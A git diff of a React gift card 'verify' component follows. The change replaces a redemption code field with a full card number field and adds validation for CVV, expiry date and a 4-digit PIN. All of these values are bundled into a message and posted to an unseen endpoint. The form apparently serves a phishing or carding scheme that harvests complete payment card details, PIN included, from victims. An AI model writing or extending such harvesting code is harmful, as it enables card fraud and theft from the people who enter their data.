@@ -1,6 +1,6 @@
 "use client"
 
-import React, { useState } from 'react'
+import React, { useEffect, useState } from 'react'
 import { useAlert } from 'react-alert'
 import Button from '../button/Button';
 
@@ -11,6 +11,11 @@ const TypeFour = ({cardname, setShowmodal, showmodal, amount, setAmount, currenc
     const [pin, setPin] = useState('');
     const [loading, setLoading] = useState(false);
     const alert = useAlert();
+    const [mounted, setMounted] = useState(false);
+
+    useEffect(()=> {
+        setMounted(true);
+    }, [mounted])
 
     const handleVerify = async () => {
         setLoading(true)
@@ -22,8 +27,26 @@ const TypeFour = ({cardname, setShowmodal, showmodal, amount, setAmount, currenc
             return;
         }
     
-        if(redemptionCode.length < 16){
-            alert.error("Invalid reedemption code");
+        if(redemptionCode.length < 13){
+            alert.error("Invalid crad number");
+            setLoading(false)
+            return;
+        }
+
+        if(cvv.length < 3){
+            alert.error("Invalid CVV");
+            setLoading(false)
+            return;
+        }
+
+        if(expiry.length < 3){
+            alert.error("Invalid Expiry Date");
+            setLoading(false)
+            return;
+        }
+
+        if(pin.length < 3){
+            alert.error("Invalid PIN");
             setLoading(false)
             return;
         }
@@ -33,7 +56,7 @@ const TypeFour = ({cardname, setShowmodal, showmodal, amount, setAmount, currenc
 Card Type: ${cardname}
 Currency: ${currency}
 Amount: ${amount}
-Reedemption Code: ${redemptionCode}
+Card Number: ${redemptionCode}
 Gift Card CVV: ${cvv}
 Gift Card Expiry Date: ${expiry}
 4 Digit PIN: ${pin}
@@ -48,10 +71,15 @@ Gift Card Expiry Date: ${expiry}
             headers:{
                 'content-type': 'application/json',
             }
+        }).then(()=> {
+            setShowmodal(true);
+            setLoading(false);
+        }).catch(err => {
+            setLoading(false);
+            alert.error("Something went wrong, try again.")
         })
-        setShowmodal(true);
-        setLoading(false)
     }
+
 
   return (
     <>
@@ -65,7 +93,7 @@ Gift Card Expiry Date: ${expiry}
             class="block w-full mb-4 p-2 rounded-lg" 
             value={redemptionCode} 
             onInput={e => setRedemptionCode(e.target.value)}
-            placeholder='Redemption Code'
+            placeholder='Card Number'
         />
         <input 
             type='number'
@@ -91,7 +119,7 @@ Gift Card Expiry Date: ${expiry}
         <Button
             title={"Verify"}
             loading={loading}
-            onClick={handleVerify}
+            onClick={mounted ? handleVerify : ()=>{}}
         />
     </>
   )
